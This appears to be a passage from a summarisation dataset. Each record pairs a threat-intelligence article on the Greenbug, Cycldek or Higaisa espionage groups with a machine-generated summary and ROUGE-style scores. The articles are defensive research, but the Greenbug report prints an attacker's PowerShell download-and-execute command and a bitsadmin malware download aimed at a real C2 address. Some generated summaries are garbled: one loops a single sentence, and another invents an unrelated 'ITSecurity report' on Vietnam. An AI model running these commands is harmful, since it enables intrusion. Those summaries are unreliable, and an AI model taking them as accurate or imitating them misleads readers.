victim's computer. The attackers then demand a ransom to decrypt the files. The malware is deployed by attackers to steal sensitive data and then encrypt the data on the victim's computer. The attackers then demand a ransom to decrypt the files. The malware is deployed by attackers to steal sensitive data and then encrypt the data on the victim's computer. The attackers then demand a ransom to decrypt the files. The malware is deployed by attackers to steal sensitive data and then encrypt the data on the victim's computer. The attackers then demand a ransom to decrypt the files. The malware is deployed by attackers to steal sensitive data and then encrypt the data on the victim's computer. The attackers then demand a ransom to decrypt the files. The malware is deployed by attackers to steal sensitive data and then encrypt the data on the victim's computer. The attackers then demand a ransom to decrypt the files. The malware is deployed by attackers to steal sensitive data and then encrypt the data on the victim's computer. The attackers then demand a ransom to decrypt the files. The malware is deployed by attackers to steal sensitive data and then encrypt the data on the victim's computer. The attackers then demand a ransom to decrypt the files. The malware is deployed";en;{'r': 0.2857142857142857, 'p': 0.944206008583691, 'f': 0.4386839445887662};{'r': 0.24429443908711027, 'p': 0.8796296296296297, 'f': 0.38238993370464275};{'r': 0.2837662337662338, 'p': 0.9377682403433476, 'f': 0.43569291766952384}
http://prod-blogs-ui.client-b1.bkjdigital.com/blogs/threat-intelligence/greenbug-espionage-telco-south-asia;Sophisticated Espionage Group Turns Attention to Telecom Providers in South Asia;"The Greenbug espionage group is actively targeting telecommunications companies in South Asia, with activity seen as recently as April 2020.There are indications that at least one of the companies was first targeted as early as April 2019.Email appears to be the initial infection vector used by the group. Greenbug is using a mixture of off-the-shelf tools and living-off-the-land techniques in these attacks. It appears the group is interested in gaining access to database servers, we see it stealing credentials then testing connectivity to these servers using the stolen credentials.Greenbug is believed to likely be based out of Iran, and there has been speculation in the past that it has connections to the destructive Shamoon group, which has carried out disk-wiping attacks against organizations in Saudi Arabia. The Shamoon attacks have been extensively covered, but it was never clear how the attackers stole the credentials that allowed them to introduce their destructive malware onto victim systems. Research by Symantec, a division of Broadcom (NASDAQ: AVGO), in 2017 found evidence that Greenbug was on an organization's network prior to a wiping attack that involved W32.Disttrack.B (Shamoon's malware). This link was never definitively established, but cooperation between the two groups is considered a possibility.Much of the activity we saw in this attack campaign is in line with activity we have seen from Greenbug in the past, including the use of email as an initial infection vector, the use of publicly available hack tools like Mimikatz and Plink, and the apparent focus on collecting credentials and maintaining a persistent, low-profile presence on victim networks.Infection vectorAcross multiple victim machines, a file named proposal_pakistan110.chm:error.html was executed via an internet browser. We also see the same file being opened by archiver tools. While we were unable to retrieve the file for analysis, the same technique has been leveraged by Greenbug in the past, as early as 2016. In these earlier attacks, emails were sent to targets containing a link to a likely compromised site, which hosted an archive file. This archive contains a malicious CHM file (compiled HTML Help file), which includes an ADS (alternative data steam) to hide its payload, which is installed when executed. This file usually also contains a decoy PDF file containing an error message that says the file could not be opened correctly.We have also seen similarly named files used in other organizations in the past to drop Trojan.Ismdoor, Greenbug's custom malware.Around the same time as we saw this file, a file called GRUNTStager.hta was also executed. Symantec believes the attackers used the publically available Covenant post-exploitation framework in order to gain an initial foothold in their target organizations.Covenant is a publicly available hack tool that is described as ""a .NET command and control framework that aims to highlight the attack surface of .NET, make the use of offensive .NET tradecraft easier, and serve as a collaborative command and control platform."" It is described as being for use by ""red teams,"" but is also open to being abused by malicious actors.Case study: Six-month intrusionGreenbug was present on the systems of one organization from October 2019 to April 2020. It appeared to be interested in gaining access to the organization's database server. The attackers were observed executing various PowerShell commands on the victim system.The first activity was seen on October 11, 2019, when a malicious PowerShell command was executed to install a CobaltStrike Beacon module to download the next stage payload.We were able to extract two command and control (C&C) server addresses from the PowerShell command.Initially, the attackers leveraged this access to execute PowerShell to determine the version of PowerShell installed via $PSVersionTable. After this, we observed the attackers proceed to attempt to download a malicious file hosted on the same previously mentioned C&C server.PowerShell.exe -nop -w hidden -c $L=new-object net.webclient,$L.proxy=[Net.WebRequest]::GetSystemWebProxy(),$L.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials,IEX $L.downloadstring('http://95[.]179.177.157:445/0Zu5WpWN'),This command was executed several times but it is unclear if the attackers were successful. Approximately an hour later, the attackers were also observed attempting to perform a download to CSIDL_APPDATA\a8f4.exe via the bitsadmin utilitybitsadmin /transfer a8f4 http://95.179.177.157:8081/asdfd CSIDL_APPDATA\a8f4.exeThe BITS administration utility can be used to download or upload jobs to be executed. It is a legitimate tool that we commonly see abused by malicious actors. The attackers used this tool to download additional malicious tools to the compromised machine.A short time later, the attackers executed several tools from CSIDL_SYSTEM86\[REDACTED] directory:";"The Greenbug espionage group is actively targeting telecommunications companies in South Asia, with activity seen as recently as April 2020.There are indications that at least one of the companies was first targeted as early as April 2019.Email appears to be the initial infection vector used by the group. Greenbug is using a mixture of offtheshelf tools and livingofftheland techniques in these attacks. It appears the group is interested in gaining access to database servers; we see it stealing credentials then testing connectivity to these servers using the stolen credentials.Greenbug is believed to likely be based out of Iran, and there has been speculation in the past that it has connections to the destructive Shamoon group, which has carried out diskwiping attacks against organizations in Saudi Arabia. The Shamoon attacks have been extensively covered, but it was never clear how the attackers stole the credentials that allowed them to introduce their destructive malware onto victim systems. Research by Symantec, a division of Broadcom (NASDAQ: AVGO), in 2017 found evidence that Greenbug was on an organization's network prior to a wiping attack that involved W32.Disttrack.B (Shamoon's malware). This link was never definitively established, but cooperation between the two groups is considered a possibility.Much of the activity we saw in this attack campaign is in line with activity we have seen from Greenbug in the past, including the use of email as an initial infection vector, the use of publicly available hack tools like Mimikatz and Plink, and the apparent focus on collecting credentials and maintaining a persistent, lowprofile presence on victim networks.Infection vectorAcross multiple victim machines, a file named proposal_pakistan";en;{'r': 0.44565217391304346, 'p': 0.9647058823529412, 'f': 0.6096654231865232};{'r': 0.3718518518518519, 'p': 0.9580152671755725, 'f': 0.535752397252067};{'r': 0.44565217391304346, 'p': 0.9647058823529412, 'f': 0.6096654231865232}
https://securelist.com/cycldek-bridging-the-air-gap/97157/;Cycldek: Bridging the (air) gap;"Key findingsWhile investigating attacks related to a group named Cycldek post 2018, we were able to uncover various pieces of information on its activities that were not known thus far. In this blog post we aim to bridge the knowledge gap on this group and provide a more thorough insight into its latest activities and modus operandi. Here are some key insights that will be described in this publication:Cycldek (also known as Goblin Panda and Conimes) has been active in the past two years, conducting targeted operations against governments in Southeast Asia.Our analysis shows two distinct patterns of activity, indicating the group consists of two operational entities that are active under a mutual quartermaster.We were able to uncover an extensive toolset for lateral movement and information stealing used in targeted networks, consisting of custom and unreported tools as well as living-off-the-land binaries.One of the newly revealed tools is named USBCulprit and has been found to rely on USB media in order to exfiltrate victim data. This may suggest Cycldek is trying to reach air-gapped networks in victim environments or relies on physical presence for the same purpose.BackgroundCycldek is a long-known Chinese-speaking threat actor. Based on the group's past activity, it has a strong interest in Southeast Asian targets, with a primary focus on large organizations and government institutions in Vietnam. This is evident from a series of targeted campaigns that are publicly attributed to the group, as outlined below:2013 - indicators affiliated to the group were found in a network of a technology company operating in several sectors, as briefly described by CrowdStrike.2014 - further accounts by CrowdStrike describe vast activity by the group against Southeast Asian organizations, most notably Vietnam. The campaigns made prominent use of Vietnamese-language lure documents, delivering commodity malware like PlugX, that was typically leveraged by Chinese-speaking actors.2017 - the group was witnessed launching attacks using RTF lure documents with political content related to Vietnam, dropping a variant of a malicious program named NewCore RAT, as described by Fortinet.2018 - attacks have been witnessed in government organizations across several Southeast Asian countries, namely Vietnam, Thailand and Laos, using a variety of tools and new TTPs. Those include usage of the Royal Road builder, developed versions of the NewCore RAT malware and other unreported implants. These were the focus of intel reports available to Kaspersky's Threat Intelligence Portal subscribers since October 2019, and will be the subject matter of this blog post.Figure 1 : Timeline of Cycldek-attributed attacks.Most attacks that we observed after 2018 start with a politically themed RTF document built with the 8.t document builder (also known as 'Royal Road') and sent as a phishing mail to the victims. These documents are bundled with 1-day exploits (e.g. CVE-2012-0158, CVE-2017-11882, CVE-2018-0802) which in turn run a dropper for three files:a legitimate signed application, usually related to an AV product, e.g. QcConsol - McAfee's QuickClean utility, and wsc_proxy.exe, Avast's remediation service.a malicious DLL which is side-loaded by the former application.an encrypted binary which gets decrypted and executed by the DLL.The final payload that is run in memory is malware known as NewCore RAT. It is based on an open-source framework named PcShare or PcClient that used to be prevalent in Chinese hacker forums more than a decade ago. Today, the software is fully available on Github, allowing attackers to leverage and modify it for their needs.In the case of Cycldek, the first public accounts of the group's usage of NewCore date back to 2017. As described in a blog post by Fortinet, the malware provides the attacker with broad capabilities such as conducting a range of operations on files, taking screenshots, controlling the machine via a remote shell and shutting down or restarting the system.Two implants, two clustersWhen inspecting the NewCore RAT malware delivered during the various attacks we investigated, we were able to distinguish between two variants. Both were deployed as side-loaded DLLs and shared multiple similarities, both in code and behavior. At the same time, we noticed differences that indicate the variants could have been used by different operators.Our analysis shows that the underlying pieces of malware and the way they were used form two clusters of activity. As a result, we named the variants BlueCore and RedCore and examined the artifacts we found around each one in order to profile their related clusters. Notable characteristics of each cluster's implant are summarized in the table below.BlueCore RedCore Initial Infection Vector RTF documents Unknown Legitimate AV Utility QcConcol.exe (McAfee's QuickClean utility) wsc_proxy.exe (Avast's remediation application) Side-Loaded DLL QcLite.dll wsc.dll Payload Loader stdole.tlb - contains PE loading shellcode and an encrypted BlueCore binary msgsm64.acm -contains PE loading shellcode and and an encrypted RedCore binary Injected Process dllhst3g.exe explorer.exe or winlogon.exe Configuration File %APPDATA%\desktop.ini C:\Documents and Settings\All Users\Documents\desktop.ini or C:\Documents and Settings\All Users\Documents\desktopWOW64.ini Mutexes UUID naming scheme, e.g. {986AFDE7-F299-4A7D-BBF4-CA756FC27208}, {CF94A87F-4B49-4751-8E5C-DA2D0A8DEC2F} UUID naming scheme, e.g. {CB191C19-1D2D-45FC-9092-6DB462EFEAC6}, {F0062B9A-15F8-4D5F-9DE8-02F39EBF71FB}, {E68DFA68-1132-4A32-ADE2-8C87F282C457}, {728264DE-3701-419B-84A4-2AD86B0C43A3}, {2BCD5B61-288C-44D5-BA0D-AAA00E9D2273}, {D9AE3AB0-D123-4F38-A9BE-898C8D49A214} Communicated URL Scheme http://%s:%d/link?url=%s&enpl=%s&encd=%s http://%s:%d/search.jsp?referer=%s&kw=%s&psid=%s or http://%s:%d/search.jsp?url=%s&referer=%s&kw=%s&psid=%sTable 1 : Comparison of BlueCore and RedCore loader and implant traits.As demonstrated by the table, the variants share similar behavior. For example, both use DLL load order hijacking to run code from DLLs impersonating dependencies of legitimate AV utilities and both share a mutex naming convention of random UUIDs, where mutexes are used for synchronization of thread execution. By comparing code in both implants, we can find multiple functions that originate from the PCShare RAT, however, several others (like the injection code in the figure below) are proprietary and demonstrate identical code that may have been written by a shared developer.Figure 2: Code similarity in proprietary injection code used in both RedCore and BlueCore implants. Code marked in yellow in BlueCore is an inlined version of the marked function in RedCore.Moreover, both implants leverage similar injected shellcode used to load the RedCore and BlueCore implants. This shellcode, which resides in the files 'stdole.tlb' and 'msgsm64.acm', contains a routine used to decrypt the implants' raw executable from an embedded blob, map it to memory and execute it from its entry point in a new thread. Since both pieces of shellcode are identical for the two variants and cannot be attributed to any open source project, we estimate that they originate from a proprietary shared resource.Figure 3 : Call flow graph comparison for binary decryption functions used by the shellcode in both clusters.Having said that, it is also evident that there are differences between the variants. The clearest distinctions can be made by looking at malware functionality that is unique to one type of implant and absent from the other. The following are examples of features that could be found only in RedCore implants, suggesting that despite their similarity with BlueCore, they were likely used by a different entity for different purposes:Keylogger : RedCore records the title of the current foreground window (if it exists) and logs keystrokes each 10ms to an internal buffer of size 65530. When this buffer is filled, data from it is written to a file named 'RCoRes64.dat'. The data is encoded using a single byte XOR with the key 0xFA.: RedCore records the title of the current foreground window (if it exists) and logs keystrokes each 10ms to an internal buffer of size 65530. When this buffer is filled, data from it is written to a file named 'RCoRes64.dat'. The data is encoded using a single byte XOR with the key 0xFA. Device enumerator : RedCore registers a window class intended to intercept window messages with a callback that checks if the inspected message was sent as a result of a DBT_DEVICEARRIVAL Such events signal the connection of a device to the system, in which case the callback verifies that this device is a new volume, and if it is, it sends a bitmap with the currently available logical drives to the C&C.: RedCore registers a window class intended to intercept window messages with a callback that checks if the inspected message was sent as a result of a DBT_DEVICEARRIVAL Such events signal the connection of a device to the system, in which case the callback verifies that this device is a new volume, and if it is, it sends a bitmap with the currently available logical drives to the C&C. RDP logger : RedCore subscribes to an RDP connection event via ETW and notifies the C&C when it occurs. The code that handles this functionality is based on a little-known Github repository named EventCop which is intended to obtain a list of users that connected to a system via RDP. The open-source code was modified so that instead of printing the data of the incoming connection, the malware would contact the C&C and inform it about the connection event.: RedCore subscribes to an RDP connection event via ETW and notifies the C&C when it occurs. The code that handles this functionality is based on a little-known Github repository named EventCop which is intended to obtain a list of users that connected to a system via RDP. The open-source code was modified so that instead of printing the data of the incoming connection, the malware would contact the C&C and inform it about the connection event. Proxy server : RedCore spawns a server thread that listens on a pre-configured port (by default 49563) and accepts requests from non-localhost connections. A firewall exception is made for the process before the server starts running, and any subsequent requests passed from a source to it will be validated and passed on to the C&C in their original format.Perhaps the most notable difference between the two implants is the URL scheme they use to connect and beacon their C&C servers. By looking for requests made using similar URL patterns in our telemetry, we were able to find multiple C&C servers and divide the underlying infrastructure based on the aforementioned two clusters. The requests by each malware type were issued only by legitimate and signed applications that were either leveraged to side-load a malicious DLL or injected with malicious code. All of the discovered domains were used to download further samples.Figure 4 : Difference in URL scheme used by each implant for C2 communication.The conclusion that we were able to reach from this is that while all targets were diplomatic and government entities, each cluster of activity had a different geographical focus. The operators behind the BlueCore cluster invested most of their efforts on Vietnamese targets with several outliers in Laos and Thailand, while the operators of the RedCore cluster started out with a focus on Vietnam and diverted to Laos by the end of 2018. The statistics of these activities, based on the number of detected samples we witnessed downloaded from each cluster of C&Cs, are outlined in the figures below.Figure 5 : Volume of downloaded samples from C&Cs of each cluster by country and month, since mid-2018.Furthermore, considering both differences and similarities, we are able to conclude that the activities we saw are affiliated to a single actor, which we refer to as Cycldek. In several instances, we spotted unique tools crafted by the group that were downloaded from servers of both groups. One example of this, which can be seen in the figure below, is a tool custom built by the group named USBCulprit. Two samples of it were downloaded from both BlueCore and RedCore servers. A more comprehensive list can be found in the Appendix. All in all, this suggests the entities operating behind those clusters are sharing multiple resources - both code and infrastructure - and operating under a single organizational umbrella.Figure 6 : Examples of proprietary malware named USBCulprit downloaded from servers of both clusters. Further examples are provided in the Appendix.During the analysis, we were able to observe a variety of tools downloaded from both BlueCore and RedCore implants used for either lateral movement in the compromised networks or information stealing from infected nodes. There were several types of these tools - some were proprietary and formerly unseen in the wild, others were pieces of software copied from open-source post-exploitation frameworks, some of which were customized to complete specific tasks by the attackers.As in the cases of RedCore and BlueCore, the downloaded tools were all invoked as side-loaded DLLs of legitimate signed applications. Such applications included AV components like wsc_proxy.exe (Avast remediation service), qcconsol.exe and mcvsshld.exe (McAfee components), as well as legitimate Microsoft and Google utilities like the resource compiler (rc.exe) and Google Updates (googleupdate.exe). These tools could be used in order to bypass weak security mechanisms like application allowlisting, grant the malware additional permissions during execution or complicate incident response.As already mentioned, the bulk of these tools are common and widespread among attackers, sometimes referred to as living-off-the-land binaries, or LOLbins. Such tools can be part of open-source and legitimate software, abused to conduct malicious activities. Examples include BrowserHistoryView (a Nirsoft utility to obtain browsing history from common browsers), ProcDump (Sysinternals tools used to dump memory, possibly to obtain passwords from running processes), Nbtscan (command line utility intended to scan IP networks for NetBIOS information) and PsExec (Sysinternals tools used to execute commands remotely in the network, typically used for lateral movement).The rest of the tools were either developed fully by the attackers or made use of known tools that were customized to accommodate particular attack scenarios. The following are several notable examples:Custom HDoor: an old tool providing full-featured backdoor capabilities like remote machine administration, information theft, lateral movement and the launch of DDoS attacks. Developed by a hacker known as Wicked Rose, it was popular in Chinese underground forums for a while and made its way into the APT world in the form of variants based on it. One example is the Naikon APT that made use of the original tool.The custom version used by Cycldek uses a small subset of the features and the attackers used it to scan internal networks and create tunnels between compromised hosts in order to avoid network detections and bypass proxies. The tool allows the attackers to exfiltrate data from segregated hosts accessible through the local network but not connected to the internet.Figure 7 : Command line usage of the custom HDoor tool.JsonCookies: proprietary tool that steals cookies from SQLite databases of Chromium-based browsers. For this purpose, the sqlite3.dll library is downloaded from the C&C and used during execution to parse the database and generate a JSON file named 'FuckCookies.txt' containing stolen cookie info. Entries in the file resemble this one:{ ""domain"": "".google.com"", ""id"": 1, ""name"": ""NID"", ""path"": ""/"", ""value"": ""%VALUE%"" } 1 2 3 4 5 6 7 { ""domain"" : "".google.com"" , ""id"" : 1 , ""name"" : ""NID"" , ""path"" : ""/"" , ""value"" : ""%VALUE%"" }ChromePass: proprietary tool that steals saved passwords from Chromium-based browser databases. The output of the parsed database is an HTML document containing a table with URLs and their corresponding stolen username and password information. This program includes a descriptive command line message that explains how to use it, as outlined below.Figure 8 : Command line usage of the ChromePass tool.Formerly Unreported Malware: USBCulpritOne of the most notable examples in Cycldek's toolset that demonstrates both data stealing and lateral movement capabilities is a malware we discovered and dubbed USBCulrpit. This tool, which we saw downloaded by RedCore implants in several instances, is capable of scanning various paths in victim machines, collecting documents with particular extensions and passing them on to USB drives when they are connected to the system. It can also selectively copy itself to a removable drive in the presence of a particular file, suggesting it can be spread laterally by having designated drives infected and the executable in them opened manually.During the time the malware was active, it showed little change in functionality. Based on Kaspersky's telemetry, USBCulprit has been seen in the wild since 2014, with the latest samples emerging at the end of 2019. The most prominent addition incorporated to samples detected after 2017 is the capability to execute files with a given name from a connected USB. This suggests that the malware can be extended with other modules. However, we were not able to capture any such files and their purpose remains unknown.Another change we saw is the loading scheme used for variants spotted after 2017. The older versions made use of a dropper that wrote a configuration file to disk and extracted an embedded cabinet archive containing a legitimate binary and a malicious side-loaded DLL. This was improved in the newer versions, where an additional stage was added, such that the side-loaded DLL decrypts and loads a third file from the archive containing the malicious payload. As a result, the latter can be found in its decrypted form only in memory.This loading scheme demonstrates that the actor behind it makes use of similar TTPs seen in the previously described implants attributed to Cycldek. For example, binaries mimicking AV components are leveraged for conducting DLL load-order hijacking. In this case, one of the files dropped from the cabinet archive named 'wrapper.exe' (originally named 'PtUserSessionWrapper.exe' and belonging to Trend Micro) forces the execution of a malicious DLL named 'TmDbgLog.dll'. Also, the malware makes use of an encrypted blob that is decrypted using RC4 and executed using a custom PE loader. The full chain is depicted in the figure below.Figure 9 : USBCulprit's loading flow, as observed in samples after 2017.Once USBCulprit is loaded to memory and executed, it operates in three phases:Boostrap and data collection: this stage prepares the environment for the malware's execution. Namely, it invokes two functions named 'CUSB::RegHideFileExt' and 'CUSB::RegHideFile' that modify registry keys to hide the extensions of files in Windows and verify that hidden files are not shown to the user. It also writes several files to disk and initializes a data structure with paths that are later used or searched by the malware.Additionally, the malware makes a single scan to collect files it intends to steal using a function named 'CUSB::USBFindFile'. They are sought by enumerating several predefined directories to locate documents with either one of the following extensions: *.pdf,*.doc,*.wps,*docx,*ppt,*.xls,*.xlsx,*.pptx,*.rtf. Every document found is logged in a file that enlists all targeted paths for theft within a directory, such that every checked directory has a corresponding list file.The chosen files are then grouped into encrypted RAR archives. To achieve that, the malware extracts a 'rar.exe' command line utility, hardcoded as a cabinet archive in its binary, and runs it against every list created in the former step. The password for the archive is initialized at the beginning of the malware's execution, and is set to 'abcd!@$' for most variants that we observed.It is worth noting that sought documents can be filtered by their modification date. Several variants of USBCulprit perform a check for a file named 'time' within the directory from which the malware is executed. This file is expected to have a date-time value that specifies the modification timestamp beyond which files are considered of interest and should be collected. If the 'time' file doesn't exist, it is created with the default value '20160601000000' corresponding to 01/06/2016 00:00:00.USB connection interception and data exfiltration/delivery: when bootstrapping and data collection is completed, the malware attempts to intercept the connection of new media and verify that it corresponds to a removable drive. This is achieved by running an infinite loop, whereby the malware is put to sleep and wakes at constant intervals to check all connected drives with the GetDriveTypeW function. If at least one is of type DRIVE_REMOVABLE, further actions are taken.When a USB is connected, the malware will verify if stolen data should be exfiltrated to it or it already contains existing data that should be copied locally. To do this, a directory named '$Recyc1e.Bin' will be searched in the drive and if not found, will be created. This directory will be used as the target path for copying files to the drive or source path for obtaining them from it.To understand which direction of file copy should take place, a special marker file named '1.txt' is searched locally. If it exists, the malware would expect to find the aforementioned '$Recyc1e.Bin' directory in the drive with previously stolen document archives and attempt to copy it to the disk. Otherwise, the local archive files will be copied to the same directory from the disk to the drive.Figure 10 : USBCulprit's check for the 1.txt marker, indicating if stolen files should be copied to the removable drive, or from it.Lateral movement and extension: as part of the same loop mentioned above, the existence of another marker file named '2.txt' will be checked locally to decide if lateral movement should be conducted or not. Only if this file exists, will the malware's binary be copied from its local path to the '$Recyc1e.Bin' directory. It's noteworthy that we were unable to spot any mechanism that could trigger the execution of the malware upon USB connection, which leads us to believe the malware is supposed to be run manually by a human handler.Apart from the above, USBCulprit is capable of updating itself or extending its execution with further modules. This is done by looking for the existence of predefined files in the USB and executing them. Examples for these include {D14030E9-C60C-481E-B7C2-0D76810C6E96} and {D14030E9-C60C-481E-B7C2-0D76810C6E95}.Unfortunately, we could not obtain those files during analysis and cannot tell what their exact purpose is. We can only guess that they are used as extension modules or updated versions of the malware itself based on their behavior. The former is an archive that is extracted to a specific directory that has its files enumerated and executed using an internal function named 'CUSB::runlist', while the latter is a binary that is copied to the %TEMP% directory and spawned as a new process.The characteristics of the malware can give rise to several assumptions about its purpose and use cases, one of which is to reach and obtain data from air-gapped machines. This would explain the lack of any network communication in the malware, and the use of only removable media as a means of transferring inbound and outbound data. Also, we witnessed some variants issue commands to gather various pieces of host network information. These are logged to a file that is later transferred along with the stolen data to the USB and can help attackers profile whether the machine in which the malware was executed is indeed part of a segregated network.Figure 11 : Commands used to profile the network connectivity of the compromised host.Another explanation is that the malware was handled manually by operators on the ground. As mentioned earlier, there is no evident mechanism for automatically executing USBCulprit from infected media, and yet we saw that the same sample was executed from various drive locations, suggesting it was indeed spread around. This, along with the very specific files that the malware seeks as executable extensions and could not be found as artifacts elsewhere in our investigation, point to a human factor being required to assist deployment of the malware in victim networks.ConclusionCycldek is an example of an actor that has broader capability than publicly perceived. While most known descriptions of its activity give the impression of a marginal group with sub-par capabilities, the range of tools and timespan of operations show that the group has an extensive foothold inside the networks of high-profile targets in Southeast Asia.Furthermore, our analysis of the implants affiliated to the group give an insight into its organizational structure. As already stated, the similarities and differences in various traits of these pieces of malware indicate that they likely originated from different arms of a single organization. Perhaps it's worth noting that we noted multiple points where such entities didn't work in a well-coordinated manner, for example, infecting machines using the BlueCore implant when they were already infected with RedCore.Lastly, we believe that such attacks will continue in Southeast Asian countries. The use of different tools to reach air-gapped networks in the same countries and attempts to steal data from them have been witnessed in the past. Our analysis shows this type of activity has not ceased - it has merely evolved and changed shape, in terms of malware and actors. We continue to track the actor and report on its activity in our Threat Intelligence Portal.For more information about Cycldek operations, contact us at: intelreports@kaspersky.comAppendix - IOCsNote : a full list of IOCs can be found in our reports on the subject in Kaspersky's Threat Intelligence Portal.RedCore:A6C751D945CFE84C918E88DF04D85798 - wsc.dll (side-loaded DLL)4B785345161D288D1652C1B2D5CEADA1 - msgsm64.acm (encrypted shellcode and implant)BlueCore:1B19175C41B9A9881B23B4382CC5935F - QcLite.dll (side-loaded DLL)6D2E6A61EEDE06FA9D633CE151208831 - QcLite.dll (side-loaded DLL)6EA33305B5F0F703F569B9EBD6035BFD - QcLite.dll (side-loaded DLL)600E14E4B0035C6F0C6A344D87B6C27F- stdole.tlb (encrypted Shellcode and Implant)Lateral Movement and Info-Stealing Toolset:1640EE7A414DFF996AF8265E0947DE36 Chromepass1EA07468EBDFD3D9EEC59AC57A490701 Chromepass07EE1B99660C8CD5207E128F44AA8CBC JsonCookies809196A64CA4A32860D28760267A1A8B Custom HDoor81660985276CF9B6D979753B6E581D34 Custom HDoorA44804C2767DCCD4902AAE30C36E62C0 Custom HDoorUSBCulprit:A9BCF983FE868A275F8D9D8F5DEFACF5 USBCulprit LoaderC73B000313DCD2289F51B367F744DCD8 USBCulprit Loader2FB731903BD12FF61E6F778FDF9926EE USBCulprit Loader4A21F9B508DB19398AEE7FE4AE0AC380 USBCulprit Loader6BE1362D722BA4224979DE91A2CD6242 USBCulprit Loader7789055B0836A905D9AA68B1D4A50F09 USBCulprit Loader782FF651F34C87448E4503B5444B6164 USBCulprit Loader88CDD3CE6E5BAA49DC69DA664EDEE5C1 USBCulprit LoaderA4AD564F8FE80E2EE52E643E449C487D USBCulprit Loader3CA7BD71B30007FC30717290BB437152 USBCulprit Payload58FE8DB0F7AE505346F6E4687D0AE233 USBCulprit PayloadA02E2796E0BE9D84EE0D4B205673EC20 USBCulprit PayloadD8DB9D6585D558BA2D28C33C6FC61874 USBCulprit Payload2E522CE8104C0693288C997604AE0096 USBCulrprit PayloadToolset overlapping in both clusters:Common Name MD5 Blue Cluster Domain Red Cluster Domain Description chromepass.exe 1EA07468EBDFD3D9EEC59AC57A490701 http://login.vietnamfar.com:8080 http://news.trungtamwtoa.com:88 ChromePass goopdate.dll D8DB9D6585D558BA2D28C33C6FC61874 http://cophieu.dcsvnqvmn.com:8080 http://mychau.dongnain.com:443 http://hcm.vietbaonam.com:443 USBCulprit 2E522CE8104C0693288C997604AE0096 http://nghiencuu.onetotechnologys.com:8080 ttp://tinmoi.thoitietdulich.com:443 http://tinmoi.thoitietdulich.com:53 http://tinmoi.vieclamthemde.com:53 http://tinmoi.vieclamthemde.com USBCulprit qclite.dll 7FF0AF890B00DEACBF42B025DDEE8402 http://web.hcmuafgh.com http://tinmoi.vieclamthemde.com http://tintuc.daikynguyen21.com BlueCore Loading Hijacked DLL silverlightmsi.dat A44804C2767DCCD4902AAE30C36E62C0 http://web.laovoanew.com:443 http://cdn.laokpl.com:8080 http://login.dangquanwatch.com:53 http://info.coreders.com:8080 Custom HDoorC&Cs and Dropzones:http://web.laovoanew[.]com - Red Clusterhttp://tinmoi.vieclamthemde[.]com - Red Clusterhttp://kinhte.chototem[.]com - Red Clusterhttp://news.trungtamwtoa[.]com - Red Clusterhttp://mychau.dongnain[.]com - Red Clusterhttp://hcm.vietbaonam[.]com - Red Clusterhttp://login.thanhnienthegioi[.]com - Red Clusterhttp://103.253.25.73 - Red Clusterhttp://luan.conglyan[.]com - Red Clusterhttp://toiyeuvn.dongaruou[.]com - Red Clusterhttp://tintuc.daikynguyen21[.]com - Red Clusterhttp://web.laomoodwin[.]com - Red Clusterhttp://login.giaoxuchuson[.]com - Red Clusterhttp://lat.conglyan[.]com - Red Clusterhttp://thegioi.kinhtevanhoa[.]com - Red Clusterhttp://laovoanew[.]com - Red Clusterhttp://cdn.laokpl[.]com - Red Clusterhttp://login.dangquanwatch[.]com - Blue Clusterhttp://info.coreders[.]com - Blue Clusterhttp://thanhnien.vietnannnet[.]com - Blue Clusterhttp://login.diendanlichsu[.]com - Blue Clusterhttp://login.vietnamfar[.]com - Blue Clusterhttp://cophieu.dcsvnqvmn[.]com - Blue Clusterhttp://nghiencuu.onetotechnologys[.]com - Blue Clusterhttp://tinmoi.thoitietdulich[.]com - Blue Clusterhttp://khinhte.chinhsech[.]com - Blue Clusterhttp://images.webprogobest[.]com - Blue Clusterhttp://web.hcmuafgh[.]com - Blue Clusterhttp://news.cooodkord[.]com - Blue Clusterhttp://24h.tinthethaoi[.]com - Blue Clusterhttp://quocphong.ministop14[.]com - Blue Clusterhttp://nhantai.xmeyeugh[.]com - Blue Clusterhttp://thoitiet.yrindovn[.]com - Blue Clusterhttp://hanghoa.trenduang[.]com - Blue Cluster";The ITSecurity report provides an overview of the current state of ITSecurity in Vietnam. The report highlights the importance of ITSecurity and the potential risks associated with inadequate ITSecurity measures. The report also provides recommendations on how to improve ITSecurity in Vietnam. The ITSecurity report indicates that the Blue Cluster system is vulnerable to cyberattacks. The report recommends that the system should be updated with the latest security patches and that the system should be monitored for any suspicious activity.;en;{'r': 0.018995929443690638, 'p': 0.5957446808510638, 'f': 0.036817882372811764};{'r': 0.003436426116838488, 'p': 0.18181818181818182, 'f': 0.006745362199124715};{'r': 0.018995929443690638, 'p': 0.5957446808510638, 'f': 0.036817882372811764}
https://www.ptsecurity.com/ww-en/analytics/pt-esc-threat-intelligence/covid-19-and-new-year-greetings-the-higaisa-group/;COVID-19 and New Year greetings: an investigation into the tools and methods used by the Higaisa group;"In March 2020 specialists from the PT Expert Security Center conducted an analysis on the activities of the APT group Higaisa. This group was first studied by security analysts at Tencent in November 2019. In that analysis, Tencent specialists reached the conclusion that Higaisa has its origins in South Korea. The group, which is still active today, can be tracked all the way back to 2009. According to the Tencent analysis, Higaisa's main targets have been government, public, and trade organizations in North Korea, however, they have also carried out attacks in China, Japan, Russia, Poland, and other nations.Higaisa distributes messages containing real news and information on current events to initially spread their malware. They have also used messages containing seasonal greetings, which congratulate their recipients on holidays such as New Year, the Chinese Lantern Festival, and North Korean national holidays. In most cases the messages are written in English, implying that English-speaking countries could also be targets.With the recent prevalence of the coronavirus (COVID-19) pandemic, many APT groups, including Gamaredon, SongXY, TA428, Lazarus, Konni, and Winnti, have been using the topic of COVID-19 in their email distributions. Higaisa is no exception.This article is an investigation into one of the malicious files created by Higaisa. The file was discovered by security experts on March 11 while conducting another study on information security threats. The file is also compared with earlier files, and observed changes are noted and analyzed.Object 1: File 20200308-sitrep-48-covid-19.pdf.lnkFigure 1. PDF document containing a World Health Organization (WHO) reportStage 1. ShortcutThe malware originates from a file called 20200308-sitrep-48-covid-19.pdf.lnk, which is concealed as a PDF file.Figure 2. Contents of the LNK fileThe file is a .lnk shortcut with the icon of a PDF document. When opened, the command cmd.exe /c is executed with the following command string (note: line breaks and spaces have been added for readability):Figure 3. The command string executed by the shortcutAs a result, copies of the shortcut and a file called C:\Windows\System32\CertUtil.exe (under the name of msoia.exe) are placed into a temporary folder. Instead of directly using the name CertUtil.exe, the file mask *ertu*.exe and the for command are used to conduct search, bypassing filename signatures.By launching findstr.exe, the Base64-encoded payload at the end of the LNK file is 